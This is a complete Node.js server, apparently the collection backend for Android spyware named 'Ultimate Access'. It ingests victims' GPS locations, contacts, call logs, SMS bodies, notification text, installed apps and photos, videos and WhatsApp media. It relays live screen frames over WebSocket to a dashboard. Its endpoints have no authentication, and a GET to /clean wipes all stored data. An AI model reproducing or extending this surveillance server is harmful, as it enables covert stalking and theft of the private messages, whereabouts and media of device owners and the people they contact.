// ============= LOAD ENVIRONMENT VARIABLES =============
require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const cloudinary = require('cloudinary').v2;

// ============= CONFIGURATION =============
const app = express();
const PORT = process.env.PORT || 5000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ============= CLOUDINARY CONFIG =============
if (process.env.CLOUDINARY_URL) {
    cloudinary.config({
        cloudinary_url: process.env.CLOUDINARY_URL
    });
    console.log('☁️ Cloudinary configured');
}

// ============= MIDDLEWARE =============
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));

// ============= CREATE UPLOADS FOLDER =============
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}
app.use('/uploads', express.static(uploadsDir));

// ============= MULTER CONFIG =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
});

// ============= MONGODB CONNECTION =============
console.log('🚀 Connecting to MongoDB...');

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected Successfully!'))
    .catch(err => {
        console.error('❌ MongoDB Connection Error:', err);
        process.exit(1);
    });

// ============= MONGOOSE SCHEMAS =============

// Device Info Schema
const DeviceInfoSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, unique: true },
    deviceName: String,
    manufacturer: String,
    model: String,
    androidVersion: String,
    sdkVersion: Number,
    brand: String,
    lastSeen: { type: Date, default: Date.now }
}, { timestamps: true });

// Location Schema
const LocationSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    speed: Number,
    bearing: Number,
    altitude: Number,
    provider: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Contact Schema
const ContactSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    name: String,
    number: String,
    numbers: [String],
    email: String,
    emails: [String],
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Call Log Schema
const CallLogSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    number: String,
    name: String,
    duration: Number,
    type: String,
    date: Date,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// SMS Schema
const SmsSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    address: String,
    body: String,
    date: Date,
    type: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// App Schema
const AppSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    packageName: String,
    appName: String,
    versionName: String,
    versionCode: Number,
    isSystemApp: Boolean,
    firstInstallTime: Date,
    lastUpdateTime: Date,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Usage Schema
const UsageSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    packageName: String,
    appName: String,
    totalTimeInForeground: Number,
    lastTimeUsed: Date,
    firstTimeUsed: Date,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Notification Schema
const NotificationSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    packageName: String,
    appName: String,
    title: String,
    text: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Battery Schema
const BatterySchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    level: Number,
    status: String,
    temperature: Number,
    voltage: Number,
    health: String,
    isCharging: Boolean,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Network Schema
const NetworkSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    networkType: String,
    wifiSSID: String,
    wifiSignalStrength: Number,
    mobileNetworkType: String,
    isWifiConnected: Boolean,
    isMobileConnected: Boolean,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Media Schema (for Cloudinary)
const MediaSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    url: String,
    publicId: String,
    type: String,
    fileName: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// ============= CREATE MODELS =============
const DeviceInfo = mongoose.model('DeviceInfo', DeviceInfoSchema);
const Location = mongoose.model('Location', LocationSchema);
const Contact = mongoose.model('Contact', ContactSchema);
const CallLog = mongoose.model('CallLog', CallLogSchema);
const Sms = mongoose.model('Sms', SmsSchema);
const App = mongoose.model('App', AppSchema);
const Usage = mongoose.model('Usage', UsageSchema);
const Notification = mongoose.model('Notification', NotificationSchema);
const Battery = mongoose.model('Battery', BatterySchema);
const Network = mongoose.model('Network', NetworkSchema);
const Media = mongoose.model('Media', MediaSchema);

// ============= GET STATS =============
app.get('/api/stats', async (req, res) => {
    try {
        const stats = {
            locations: await Location.countDocuments(),
            callLogs: await CallLog.countDocuments(),
            sms: await Sms.countDocuments(),
            contacts: await Contact.countDocuments(),
            media: await Media.countDocuments()
        };
        res.json({ success: true, stats });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============= CLEAN DATABASE =============
app.get('/clean', async (req, res) => {
    try {
        const counts = {
            devices: await DeviceInfo.countDocuments(),
            locations: await Location.countDocuments(),
            contacts: await Contact.countDocuments(),
            callLogs: await CallLog.countDocuments(),
            sms: await Sms.countDocuments(),
            apps: await App.countDocuments(),
            usage: await Usage.countDocuments(),
            notifications: await Notification.countDocuments(),
            battery: await Battery.countDocuments(),
            network: await Network.countDocuments(),
            media: await Media.countDocuments()
        };

        await DeviceInfo.deleteMany({});
        await Location.deleteMany({});
        await Contact.deleteMany({});
        await CallLog.deleteMany({});
        await Sms.deleteMany({});
        await App.deleteMany({});
        await Usage.deleteMany({});
        await Notification.deleteMany({});
        await Battery.deleteMany({});
        await Network.deleteMany({});
        await Media.deleteMany({});

        console.log('🧹 Database cleaned completely');
        res.json({ success: true, message: '✅ Database cleaned successfully!', deleted: counts });
    } catch (error) {
        console.error('❌ Clean error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============= WEBSOCKET FOR LIVE SCREEN =============
wss.on('connection', (ws) => {
    console.log('🟢 WebSocket Client Connected');

    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);

            if (message.type === 'screen_frame') {
                wss.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({
                            type: 'screen_frame',
                            deviceId: message.deviceId || 'unknown',
                            image: message.image,
                            timestamp: Date.now()
                        }));
                    }
                });
            }
        } catch (e) {
            console.error('WebSocket error:', e.message);
        }
    });

    ws.on('close', () => console.log('🔴 WebSocket Client Disconnected'));
});

// ============= API ENDPOINTS =============

// Health Check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date(),
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
        websocket: 'running'
    });
});

// Device Registration
app.post('/api/register', async (req, res) => {
    try {
        const deviceData = req.body;
        console.log('📱 Device Registration:', deviceData.deviceId);

        const existing = await DeviceInfo.findOne({ deviceId: deviceData.deviceId });

        if (existing) {
            existing.lastSeen = new Date();
            existing.deviceName = deviceData.deviceName || existing.deviceName;
            await existing.save();
            return res.json({ success: true, message: 'Device updated' });
        }

        const deviceInfo = new DeviceInfo(deviceData);
        await deviceInfo.save();
        console.log('✅ New device registered:', deviceData.deviceId);
        res.json({ success: true, message: 'Device registered' });
    } catch (error) {
        console.error('❌ Device registration error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Location Data
app.post('/api/location', async (req, res) => {
    try {
        const location = new Location(req.body);
        await location.save();
        console.log(`📍 Location saved - Device: ${req.body.deviceId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Location error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Contacts Data
app.post('/api/contacts', async (req, res) => {
    try {
        const { deviceId, contacts } = req.body;

        if (!deviceId || !Array.isArray(contacts)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        await Contact.deleteMany({ deviceId });
        const contactsToSave = contacts.map(contact => ({ deviceId, ...contact }));
        await Contact.insertMany(contactsToSave);

        console.log(`👤 Contacts saved - Device: ${deviceId}, Count: ${contacts.length}`);
        res.json({ success: true, count: contacts.length });
    } catch (error) {
        console.error('❌ Contacts error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Call Logs
app.post('/api/calllogs', async (req, res) => {
    try {
        const { deviceId, callLogs } = req.body;

        if (!deviceId || !Array.isArray(callLogs)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const logsToSave = callLogs.map(log => ({ deviceId, ...log }));
        await CallLog.insertMany(logsToSave);

        console.log(`📞 Call logs saved - Device: ${deviceId}, Count: ${callLogs.length}`);
        res.json({ success: true, count: callLogs.length });
    } catch (error) {
        console.error('❌ Call logs error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// SMS Data
app.post('/api/sms', async (req, res) => {
    try {
        const { deviceId, messages } = req.body;

        if (!deviceId || !Array.isArray(messages)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const smsToSave = messages.map(msg => ({ deviceId, ...msg }));
        await Sms.insertMany(smsToSave);

        console.log(`💬 SMS saved - Device: ${deviceId}, Count: ${messages.length}`);
        res.json({ success: true, count: messages.length });
    } catch (error) {
        console.error('❌ SMS error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============= INSTALLED APPS WITH DEBUGGING =============
app.post('/api/apps', async (req, res) => {
    try {
        const { deviceId, apps } = req.body;

        // 🔥 SUPER DEBUG
        console.log('🔍 ====== APPS API CALL RECEIVED ======');
        console.log('📱 Device ID:', deviceId);
        console.log('📱 Apps type:', typeof apps);
        console.log('📱 Is array?', Array.isArray(apps));
        console.log('📱 Apps length:', apps ? apps.length : 'null');

        if (!deviceId) {
            console.log('❌ Missing deviceId');
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        if (!apps) {
            console.log('❌ apps is null/undefined');
            return res.status(400).json({ success: false, error: 'Apps data required' });
        }

        if (!Array.isArray(apps)) {
            console.log('❌ apps is not an array');
            return res.status(400).json({ success: false, error: 'Apps must be an array' });
        }

        console.log(`📱 Apps array length: ${apps.length}`);

        await App.deleteMany({ deviceId });
        console.log('🗑️ Deleted old apps for device:', deviceId);

        if (apps.length === 0) {
            console.log('⚠️ No apps to save');
            return res.json({ success: true, count: 0 });
        }

        const appsToSave = apps.map((app, index) => {
            return {
                deviceId,
                packageName: app.packageName || app.pkg || app.package || app.id || '',
                appName: app.appName || app.name || app.applicationName || app.label || `App ${index+1}`,
                versionName: app.versionName || app.version || app.ver || '',
                versionCode: parseInt(app.versionCode || app.code || 0) || 0,
                isSystemApp: Boolean(app.isSystemApp || app.systemApp || app.system || false),
                firstInstallTime: app.firstInstallTime ? new Date(app.firstInstallTime) : null,
                lastUpdateTime: app.lastUpdateTime ? new Date(app.lastUpdateTime) : null,
                timestamp: new Date()
            };
        });

        const saved = await App.insertMany(appsToSave);
        console.log(`✅ SUCCESS: Saved ${saved.length} apps for device:`, deviceId);

        const verifyCount = await App.countDocuments({ deviceId });
        console.log(`✅ Verification: Database now has ${verifyCount} apps`);

        res.json({ success: true, count: saved.length });

    } catch (error) {
        console.error('❌ Apps error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Usage Stats
app.post('/api/usage', async (req, res) => {
    try {
        const { deviceId, usageStats } = req.body;

        if (!deviceId || !Array.isArray(usageStats)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const usageToSave = usageStats.map(usage => ({ deviceId, ...usage }));
        await Usage.insertMany(usageToSave);

        console.log(`⏱️ Usage stats saved - Device: ${deviceId}, Count: ${usageStats.length}`);
        res.json({ success: true, count: usageStats.length });
    } catch (error) {
        console.error('❌ Usage error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Notifications
app.post('/api/notifications', async (req, res) => {
    try {
        const { deviceId, notifications } = req.body;

        if (!deviceId || !Array.isArray(notifications)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const notifsToSave = notifications.map(notif => ({ deviceId, ...notif }));
        await Notification.insertMany(notifsToSave);

        console.log(`🔔 Notifications saved - Device: ${deviceId}, Count: ${notifications.length}`);
        res.json({ success: true, count: notifications.length });
    } catch (error) {
        console.error('❌ Notifications error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Battery Status
app.post('/api/battery', async (req, res) => {
    try {
        const battery = new Battery(req.body);
        await battery.save();
        console.log(`🔋 Battery status - Device: ${req.body.deviceId}, Level: ${req.body.level}%`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Battery error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Network Status
app.post('/api/network', async (req, res) => {
    try {
        const network = new Network(req.body);
        await network.save();
        console.log(`🌐 Network status - Device: ${req.body.deviceId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Network error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Media Upload
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const { deviceId, type } = req.body;

        if (!deviceId || !req.file) {
            return res.status(400).json({ success: false, error: 'Missing data' });
        }

        let url = '';
        let publicId = '';

        if (process.env.CLOUDINARY_URL) {
            try {
                const result = await cloudinary.uploader.upload(req.file.path, {
                    folder: `ultimate_access/${deviceId}/${type}`,
                    resource_type: 'auto'
                });
                url = result.secure_url;
                publicId = result.public_id;
                fs.unlinkSync(req.file.path);
            } catch (cloudinaryError) {
                console.error('Cloudinary upload failed:', cloudinaryError);
                url = `/uploads/${req.file.filename}`;
            }
        } else {
            url = `/uploads/${req.file.filename}`;
        }

        const media = new Media({
            deviceId,
            url,
            publicId,
            type,
            fileName: req.file.originalname
        });
        await media.save();

        console.log(`📸 Media uploaded - Device: ${deviceId}, Type: ${type}`);
        res.json({ success: true, url, publicId });
    } catch (error) {
        console.error('❌ Media upload error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// GET LATEST PHOTO
app.get('/api/photo/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        const photo = await Media.findOne({
            deviceId,
            type: { $regex: /camera|screenshot|whatsapp|gallery|image|photo/i }
        }).sort({ timestamp: -1 });

        if (!photo) {
            return res.status(404).json({ success: false, message: 'No photo found' });
        }

        res.json({ success: true, url: photo.url, timestamp: photo.timestamp, type: photo.type });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// GET LATEST VIDEO
app.get('/api/video/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        const video = await Media.findOne({
            deviceId,
            type: { $regex: /video|mp4|movie|recording|gif|mkv|mov|avi/i }
        }).sort({ timestamp: -1 });

        if (!video) {
            return res.status(404).json({ success: false, message: 'No video found' });
        }

        res.json({ success: true, url: video.url, timestamp: video.timestamp, type: video.type });
    } catch (error) {
        console.error('❌ Video error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============= 🔥 FIXED: BULK SYNC WITH APPS =============
app.post('/api/sync', async (req, res) => {
    try {
        const { deviceId, data } = req.body;

        if (!deviceId || !data) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        console.log('🔄 Bulk sync received for device:', deviceId);
        const results = {};

        // Call Logs
        if (data.callLogs && Array.isArray(data.callLogs)) {
            await CallLog.insertMany(data.callLogs.map(c => ({ deviceId, ...c })));
            results.callLogs = data.callLogs.length;
        }

        // SMS
        if (data.sms && Array.isArray(data.sms)) {
            await Sms.insertMany(data.sms.map(s => ({ deviceId, ...s })));
            results.sms = data.sms.length;
        }

        // Contacts
        if (data.contacts && Array.isArray(data.contacts)) {
            await Contact.deleteMany({ deviceId });
            await Contact.insertMany(data.contacts.map(c => ({ deviceId, ...c })));
            results.contacts = data.contacts.length;
        }

        // 🔥🔥 FIX: APPS BULK SYNC 🔥🔥
        if (data.apps && Array.isArray(data.apps)) {
            // Delete old apps
            await App.deleteMany({ deviceId });

            // Save new apps
            const appsToSave = data.apps.map(app => ({
                deviceId,
                packageName: app.packageName || app.pkg || app.package || app.id || '',
                appName: app.appName || app.name || app.applicationName || app.label || 'Unknown',
                versionName: app.versionName || app.version || app.ver || '',
                versionCode: parseInt(app.versionCode || app.code || 0) || 0,
                isSystemApp: Boolean(app.isSystemApp || app.systemApp || app.system || false),
                timestamp: new Date()
            }));

            await App.insertMany(appsToSave);
            results.apps = data.apps.length;
            console.log(`✅ Saved ${data.apps.length} apps via bulk sync`);
        }

        // Battery
        if (data.battery) {
            const battery = new Battery({ deviceId, ...data.battery });
            await battery.save();
            results.battery = 1;
        }

        // Network
        if (data.network) {
            const network = new Network({ deviceId, ...data.network });
            await network.save();
            results.network = 1;
        }

        // Location (if sent separately)
        if (data.location) {
            const location = new Location({ deviceId, ...data.location });
            await location.save();
            results.location = 1;
        }

        console.log(`✅ Bulk sync complete - Device: ${deviceId}`, results);
        res.json({ success: true, results });

    } catch (error) {
        console.error('❌ Bulk sync error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get Device Data
app.get('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        const device = await DeviceInfo.findOne({ deviceId });
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const apps = await App.find({ deviceId });
        console.log(`📱 Device ${deviceId} has ${apps.length} apps in database`);

        const data = {
            device,
            locations: await Location.find({ deviceId }).sort({ timestamp: -1 }).limit(100),
            contacts: await Contact.find({ deviceId }),
            callLogs: await CallLog.find({ deviceId }).sort({ date: -1 }).limit(100),
            sms: await Sms.find({ deviceId }).sort({ date: -1 }).limit(100),
            apps: apps,
            usage: await Usage.find({ deviceId }).sort({ timestamp: -1 }).limit(50),
            notifications: await Notification.find({ deviceId }).sort({ timestamp: -1 }).limit(50),
            battery: await Battery.find({ deviceId }).sort({ timestamp: -1 }).limit(20),
            network: await Network.find({ deviceId }).sort({ timestamp: -1 }).limit(20),
            media: await Media.find({ deviceId }).sort({ timestamp: -1 }).limit(50)
        };

        res.json({ success: true, data });
    } catch (error) {
        console.error('❌ Get device data error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get All Devices
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await DeviceInfo.find().sort({ lastSeen: -1 });
        res.json({ success: true, devices });
    } catch (error) {
        console.error('❌ Get devices error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Delete Device
app.delete('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        await DeviceInfo.deleteOne({ deviceId });
        await Location.deleteMany({ deviceId });
        await Contact.deleteMany({ deviceId });
        await CallLog.deleteMany({ deviceId });
        await Sms.deleteMany({ deviceId });
        await App.deleteMany({ deviceId });
        await Usage.deleteMany({ deviceId });
        await Notification.deleteMany({ deviceId });
        await Battery.deleteMany({ deviceId });
        await Network.deleteMany({ deviceId });
        await Media.deleteMany({ deviceId });

        console.log(`🗑️ Device deleted: ${deviceId}`);
        res.json({ success: true, message: 'Device deleted' });
    } catch (error) {
        console.error('❌ Delete error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============= SERVE DASHBOARD =============
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/', (req, res) => {
    res.redirect('/dashboard');
});

// ============= START SERVER =============
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔══════════════════════════════════════════════╗
    ║     🚀 ULTIMATE ACCESS SERVER RUNNING       ║
    ╠══════════════════════════════════════════════╣
    ║  📍 URL: http://localhost:${PORT}               ║
    ║  📊 Dashboard: http://localhost:${PORT}/dashboard ║
    ║  🔌 WebSocket: ws://localhost:${PORT}           ║
    ║  🗄️  MongoDB: ${mongoose.connection.readyState === 1 ? '✅' : '❌'}                    ║
    ║  ☁️  Cloudinary: ${process.env.CLOUDINARY_URL ? '✅' : '❌'}              ║
    ║  📊 Stats API: /api/stats                    ║
    ║  📸 Photo API: /api/photo/:deviceId         ║
    ║  🎥 Video API: /api/video/:deviceId ✅       ║
    ║  📱 Apps API: /api/apps 🔥 DEBUG ENABLED     ║
    ║  🔄 Bulk Sync: /api/sync ✅ APPS FIXED       ║
    ║  🧹 Clean API: /clean                        ║
    ╚══════════════════════════════════════════════╝
    `);
});